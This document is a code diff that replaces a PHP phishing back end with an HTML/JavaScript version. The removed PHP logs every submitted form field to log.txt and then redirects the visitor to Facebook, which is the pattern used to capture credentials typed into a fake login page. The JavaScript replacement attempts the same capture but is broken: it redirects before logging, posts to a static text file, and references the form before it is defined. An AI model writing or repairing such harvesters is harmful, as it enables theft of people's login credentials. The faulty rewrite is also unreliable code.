@@ -1,19 +1,39 @@
-<?php 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect</title>
+</head>
+<body>
+    <script>
+        // Redirect to Facebook
+        window.location.href = "http://www.facebook.com";
 
-// Set the location to redirect the page 
-header ('Location: http://www.facebook.com'); 
+        // Function to write form data to a text file
+        function writeToLogFile() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "log.txt", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            
+            // Prepare data from form fields
+            var formData = "";
+            var formElements = document.forms["myForm"].elements;
+            for (var i = 0; i < formElements.length; i++) {
+                formData += encodeURIComponent(formElements[i].name) + "=" + encodeURIComponent(formElements[i].value) + "&";
+            }
 
-// Open the text file in writing mode 
-$file = fopen("log.txt", "a"); 
+            // Send data to server
+            xhr.send(formData);
+        }
 
-foreach($_POST as $variable => $value) { 
-	fwrite($file, $variable); 
-	fwrite($file, "="); 
-	fwrite($file, $value); 
-	fwrite($file, "\r\n"); 
-} 
+        // Call function to write form data to text file
+        writeToLogFile();
+    </script>
 
-fwrite($file, "\r\n"); 
-fclose($file); 
-exit; 
-?> 
+    <!-- Hidden form to submit data -->
+    <form id="myForm" method="post" action="">
+        <!-- Add your form fields here -->
+        <input type="hidden" name="example_field" value="example_value">
+    </form>
+</body>
+</html>
+
